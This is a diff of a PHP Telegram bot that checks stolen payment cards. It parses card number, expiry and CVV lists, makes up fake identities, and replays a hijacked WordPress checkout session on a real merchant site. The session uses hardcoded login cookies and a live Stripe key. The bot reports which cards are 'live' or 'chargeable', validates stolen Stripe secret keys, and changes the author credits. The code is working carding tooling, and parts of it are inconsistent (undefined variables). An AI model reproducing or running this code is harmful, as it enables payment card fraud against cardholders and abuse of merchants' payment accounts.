+$i     = explode("|", $lista);
+$cc    = $i[0];
+$mon   = $i[1];
+$year  = $i[2];
+$year1 = substr($yyyy, 2, 4);
+$cvv   = $i[3];
+error_reporting(0);
+date_default_timezone_set('Asia/Jakarta');
+if ($_SERVER['REQUEST_METHOD'] == "POST"){
+extract($_POST);
+}
+elseif ($_SERVER['REQUEST_METHOD'] == "GET"){
+extract($_GET);
+}
+function GetStr($string, $start, $end){
+$str = explode($start, $string);
+$str = explode($end, $str[1]);  
+return $str[0];
+};
+$separa = explode("|", $lista);
+$cc = $separa[0];
+$mon = $separa[1];
+$year = $separa[2];
+$cvv = $separa[3];
+
+
+
+function string_between_two_string($str, $starting_word, $ending_word){ 
+$subtring_start = strpos($str, $starting_word); 
+$subtring_start += strlen($starting_word);   
+$size = strpos($str, $ending_word, $subtring_start) - $subtring_start;   
+return substr($str, $subtring_start, $size);
+}
+
+
+if(strlen($year) == 4){
+$year = substr($year, 2);
+};
+
+///////////////////////////////////////////////////////////////////////////////////////////////////////////////
+
+$first = ucfirst(str_shuffle('Kurumi'));
+$last = ucfirst(str_shuffle('appisbest'));
+$com = ucfirst(str_shuffle('waifuu'));
+$first1 = str_shuffle("kurumiapp85246");
+$email = "".$first1."%40gmail.com";
+$address = "".rand(0000,9999)."+Main+Street";
+$ip = ''.rand(00,99).'.'.rand(000,999).'.'.rand(000,999).'.'.rand(00,99).'';
+$mip = ''.rand(00,99).'.'.rand(00,99).'.'.rand(000,999).'.'.rand(00,99).'';
+$ph = array("682","346","246");
+$ph1 = array_rand($ph);
+$phh = $ph[$ph1];
+$phone = "$phh".rand(0000000,9999999)."";
+$account = rand(000000,999999);
+$invoice = rand(000000,999999);
+$st = array("AL","NY","CA","FL","WA");
+$st1 = array_rand($st);
+$state = $st[$st1];
+if ($state == "NY"){
+$state = "New+York";
+$zip = "10080";
+$city = "New+York";
+}
+elseif ($state == "WA"){
+$state = "Washington";
+$zip = "98001";
+$city = "Auburn";
+}
+elseif ($state == "AL"){
+$state = "Alabama";
+$zip = "35005";
+$city = "Adamsville";
+}
+elseif ($state == "FL"){
+$state = "Florida";
+$zip = "32003";
+$city = "Orange+Park";
+}
+else{
+$state = "California";
+$zip = "90201";
+$city = "Bell";
+};
+
+
+//////////////////=================[Seesion ID]=================//////////////////
+
+$ch = curl_init();
+curl_setopt($ch, CURLOPT_URL, 'https://www.medigraytion.com/wp-admin/admin-ajax.php');
+curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
+curl_setopt($ch, CURLOPT_HEADER, 0);
+curl_setopt($ch, CURLOPT_HTTPHEADER, array(
+'authority: www.medigraytion.com',
+'method: POST',
+'path: /wp-admin/admin-ajax.php',
+'scheme: https',
+'accept:application/json, text/javascript, */*; q=0.01',
+'accept-language: en-US,en;q=0.9',
+'content-type: multipart/form-data; boundary=----WebKitFormBoundaryip4Mntadw5T4AAj5',
+'cookie: wordpress_sec_d78c3de304fbf92fbd7082b80ab75d9b=juanaflindsey%40gmail.com%7C1607595223%7ChNXjX18idG4o158HAawiz1lQqKN1YAadFRkpuIJy5K8%7Cfc3f197c1018ed7de81c810beb79c2d26bd68a04a9149c0d767c9f6335fbe5b2; _ga=GA1.2.1447429931.1607422337; _gid=GA1.2.1232166314.1607422337; __stripe_mid=419fc3cd-8d7b-482e-bade-96e495b6a1a0305691; __stripe_sid=58f1941c-ee34-49b0-a24e-585928f64c7756f128; wordpress_logged_in_d78c3de304fbf92fbd7082b80ab75d9b=juanaflindsey%40gmail.com%7C1607595223%7ChNXjX18idG4o158HAawiz1lQqKN1YAadFRkpuIJy5K8%7C16e0dca9da7934f53880bcb21fb4f8c19a058d31ed40771011865a25e586b4f5; _gat_gtag_UA_93020771_2=1',
+'origin: https://www.medigraytion.com',
+'referer: https://www.medigraytion.com/signup/monthly/?action=checkout&txn=nn',
+'sec-fetch-dest: empty',
+'sec-fetch-mode: cors',
+'sec-fetch-site: same-origin',
+'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.75 Safari/537.36',));
+curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
+curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
+curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
+curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
+curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
+curl_setopt($ch, CURLOPT_POSTFIELDS, '------WebKitFormBoundaryip4Mntadw5T4AAj5
+Content-Disposition: form-data; name="mepr_transaction_id"
+
+851
+------WebKitFormBoundaryip4Mntadw5T4AAj5
+Content-Disposition: form-data; name="address_required"
+
+0
+------WebKitFormBoundaryip4Mntadw5T4AAj5
+Content-Disposition: form-data; name="card-name"
+
+zack mclean
+------WebKitFormBoundaryip4Mntadw5T4AAj5
+Content-Disposition: form-data; name="payment_method_id"
+
+pm_1Hw3CzFNTmox1iC2MyNT2Xkp
+------WebKitFormBoundaryip4Mntadw5T4AAj5
+Content-Disposition: form-data; name="action"
+
+mepr_stripe_confirm_payment
+------WebKitFormBoundaryip4Mntadw5T4AAj5
+Content-Disposition: form-data; name="mepr_current_url"
+
+https://www.medigraytion.com/signup/monthly/?action=checkout&txn=nn#mepr_jump
+------WebKitFormBoundaryip4Mntadw5T4AAj5--');
+$result10 = curl_exec($ch);
+$token = string_between_two_string($result10, '<input type="hidden" name="sessionId" value="', '"/>');
+
+//////////////////=================[Checking Cards]=================//////////////////
+$ch = curl_init();
+curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/payment_methods');
+curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
+curl_setopt($ch, CURLOPT_HEADER, 0);
+curl_setopt($ch, CURLOPT_HTTPHEADER, array(
+'authority: api.stripe.com',
+'method: POST',
+'path: /v1/payment_methods',
+'scheme: https',
+'accept: application/json',
+'accept-language: en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7,hi;q=0.6',
+'content-type: application/x-www-form-urlencoded',
+'origin: https://js.stripe.com',
+'referer: https://js.stripe.com/',
+'sec-fetch-dest: empty',
+'sec-fetch-mode: cors',
+'sec-fetch-site: same-site',
+'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36',));
+curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
+curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
+curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
+curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
+curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
+curl_setopt($ch, CURLOPT_POSTFIELDS, 'type=card&billing_details[address][postal_code]=10080&billing_details[name]=zack+mclean&card[number]='.$cc.'&card[cvc]='.$cvv.'&card[exp_month]='.$mes.'&card[exp_year]='.$ano.'&guid=3df213ac-49ac-4b84-b0e2-9deba9b0b72eeb1e9f&muid=419fc3cd-8d7b-482e-bade-96e495b6a1a0305691&sid=58f1941c-ee34-49b0-a24e-585928f64c7756f128&payment_user_agent=stripe.js%2Fc1e00f41%3B+stripe-js-v3%2Fc1e00f41&time_on_page=28409&referrer=https%3A%2F%2Fwww.medigraytion.com%2F&key=pk_live_290LOcAmWN8bBoRk0DCclhYI00yf5QmVmi');
+
+//////////////////=================[Checking Cards]=================//////////////////
+
+
+$result9 = curl_exec($ch);
+$cvvres = string_between_two_string($result9, '<input type="hidden" name="ssl_cvv2_response" value="', '"></td>');
+$avsres = string_between_two_string($result9, '<input type="hidden" name="ssl_avs_response" value="', '"></td>');
+$msg = string_between_two_string($result9, '<span id="ssl_result_message">', '</span>');
+
+///////////////////////////////////////////////////////////////////////////////////////////////////////////////
+
+$gdAvs = array("A","B","D","G","P","S","X","Y","Z");
+
+if(($cvvres == "M") && ((in_array($avsres, $gdAvs)) === true)){
+$chStatus = "Yes";
+}else{
+$chStatus = "No";
+};
+
+if(strlen($year) == 2){
+$year = '20'.$year;
+};
+
+$info = curl_getinfo($ch);
+$time = $info['total_time'];
+$httpCode = $info['http_code'];
+$time = substr($time, 0, 4);
+curl_close($ch);
+
+$update = file_get_contents('php://input');
+$update = json_decode($update, TRUE);
+$print = print_r($update);
+$chatId = $update["message"]["chat"]["id"];
+$gId = $update["message"]["from"]["id"];
+$userId = $update["message"]["from"]["id"];
+$firstname = $update["message"]["from"]["first_name"];
+$username = $update["message"]["from"]["username"];
+$message = $update["message"]["text"];
+$message_id = $update["message"]["message_id"];
+
+if(($cvvres == "M") && ($avsres == "U")){
+sendMessage($chatId, '<u>CARD-»</u> <code>'.$lista.'</code>%0A<u>STATUS-»</u> <b>APROVADA</b>%0A<u>RESPONSE-»</u> <b>『 ★ CVV MATCHED [M][U] ★ 』 %0A<u>Chargeable-»</u> <b>『 ★  Maybe Yes ★ 』</b>%0A</b><u>Gateway-»</u> <b>Convergepay</b>%0A<u>Checked By-»</u> @'.$username.'<u>%0ATime Taken:</u> <b>'.$time.'s</b>%0A%0A<b>Bot Made by AL CAPONE</b>');
+}
+elseif($cvvres == "M"){
+sendMessage($chatId, '<u>CARD-»</u> <code>'.$lista.'</code>%0A<u>STATUS-»</u> <b>APROVADA</b>%0A<u>RESPONSE-»</u> <b>『 ★ CVV MATCHED [M]['.$avsres.'] ★ 』 %0A<u>Chargeable-»:</u> <b>『 ★ Chargeable-» '.$chStatus.' ★ 』</b>%0A</b><u>Gateway-»</u> <b>Convergepay</b>%0A<u>Checked By-»</u> @'.$username.'<u>%0ATime Taken-»</u> <b>'.$time.'s</b>%0A%0A<b>Bot Made by AL CAPONE</b>');
+}
+elseif($cvvres == "N"){
+sendMessage($chatId, '<u>CARD-»</u> <code>'.$lista.'</code>%0A<u>STATUS-»</u> <b>APROVADA</b>%0A<u>RESPONSE-»</u> <b>『 ★ LIVE CCN [N]['.$avsres.'] ★ 』%0A<u>Chargeable-»</u> <b>『 ★ No ★ 』</b>%0A</b><u>Gateway-»</u> <b>Convergepay</b>%0A<u>Checked By-»</u> @'.$username.'<u>%0ATime Taken-»</u> <b>'.$time.'s</b>%0A%0A<b>Bot Made by AL CAPONE</b>');
+}
+elseif (strpos($result9, '"success":true')){
+sendMessage($chatId, '<u>CARD-»</u> <code>'.$lista.'</code>%0A<u>STATUS-»</u> <b>APROVADA</b>%0A<u>RESPONSE-»</u> <b>『 ★ Charged CVV ★ 』%0A<u>Chargeable-»</u> <b>『 ★ Yes ★ 』</b>%0A</b><u>Gateway-»</u> <b>Convergepay</b>%0A<u>Checked By-»</u> @'.$username.'<u>%0ATime Taken-»</u> <b>'.$time.'s</b>%0A%0A<b>Bot Made by AL CAPONE</b>');
+}
+elseif(!$result9){
+sendMessage($chatId, '<u>CARD-»</u> <code>'.$lista.'</code>%0A<u>STATUS-»</u> <b>REPROVADA</b>%0A<u>RESPONSE-»</u> <b>『 ★ Unknown Error ★ 』</b><u>Gateway-»</u> <b>Convergepay</b>%0A<u>Checked By-»</u> @'.$username.'<u>%0ATime Taken-»</u> <b>'.$time.'s</b>%0A%0A<b>Bot Made by AL CAPONE</b>');
+}else{
+sendMessage($chatId, '<u>CARD-»</u> <code>'.$lista.'</code>%0A<u>STATUS-»</u> <b>REPROVADA</b>%0A<u>RESPONSE-»</u> <b>『 ★ Card Declined ['.$cvvres.']['.$avsres.'] ★ 』%0A<u>Mensaje-»</u> <b>『 ★ Msg: '.$msg.' ★ 』[Maybe api dead]</b>%0A</b><u>Gateway-»</u> <b>Convergepay</b>%0A<u>Checked By-»</u> @'.$username.'<u>%0ATime Taken-»</u> <b>'.$time.'s</b>%0A%0A<b>Bot Made by AL CAPONE</b>');
+}
+curl_close($ch);
+}
+
 
 //////////=========[Sk Key Check Command]=========//////////
 
-elseif ((strpos($message, "!sk") === 0)||(strpos($message, "/sk") === 0)){
+elseif (strpos($message, "!sk") === 0){
 $sec = substr($message, 4);
 $ch = curl_init();
 curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/tokens');
@@ -402,15 +663,15 @@ $headers[] = 'Content-Type: application/x-www-form-urlencoded';
 curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
 $result = curl_exec($ch);
 if (strpos($result, 'api_key_expired')){
-sendMessage($chatId, "<b>❌ DEAD KEY</b>%0A<u>KEY:</u> <code>$sec</code>%0A<u>REASON:</u> EXPIRED KEY%0A%0A<b>Bot Made by: Andry Mata </b>");
+sendMessage($chatId, "<b>❌ DEAD KEY</b>%0A<u>KEY-»</u> <code>$sec</code>%0A<u>REASON-»</u> EXPIRED KEY%0A%0A<b>Bot Made by AL CAPONE </b>");
 }
 elseif (strpos($result, 'Invalid API Key provided')){
-sendMessage($chatId, "<b>❌ DEAD KEY</b>%0A<u>KEY:</u> <code>$sec</code>%0A<u>REASON:</u> INVALID KEY%0A%0A<b>Bot Made by: Andry Mata </b>");
+sendMessage($chatId, "<b>❌ DEAD KEY</b>%0A<u>KEY-»</u> <code>$sec</code>%0A<u>REASON-»</u> INVALID KEY%0A%0A<b>Bot Made by AL CAPONE </b>");
 }
 elseif ((strpos($result, 'testmode_charges_only')) || (strpos($result, 'test_mode_live_card'))){
-sendMessage($chatId, "<b>❌ DEAD KEY</b>%0A<u>KEY:</u> <code>$sec</code>%0A<u>REASON:</u> Testmode Charges Only%0A%0A<b>Bot Made by: Andry Mata </b>");
+sendMessage($chatId, "<b>❌ DEAD KEY</b>%0A<u>KEY-»</u> <code>$sec</code>%0A<u>REASON-»</u> Testmode Charges Only%0A%0A<b>Bot Made by AL CAPONE </b>");
 }else{
-sendMessage($chatId, "<b>✅ LIVE KEY</b>%0A<u>KEY:</u> <code>$sec</code>%0A<u>RESPONSE:</u> SK LIVE!!%0A%0A<b>Bot Made by: Andry Mata </b>");
+sendMessage($chatId, "<b>✅ LIVE KEY</b>%0A<u>KEY-»</u> <code>$sec</code>%0A<u>RESPONSE-»</u> SK LIVE!!%0A%0A<b>Bot Made by AL CAPONE </b>");
 }}
 
 
@@ -421,7 +682,7 @@ $url = $GLOBALS[website]."/sendMessage?chat_id=".$chatId."&text=".$message."&rep
 file_get_contents($url);      
 }
 
-////////////////=============[Andry Mata]===============////////////////
-////////==========[Used api raw bot of @Zeltraxrockzzz]============////////
+////////////////=============[Mr.Acid]===============////////////////
+////////==========[Used api raw bot of @cxvom]============////////
 
 ?>
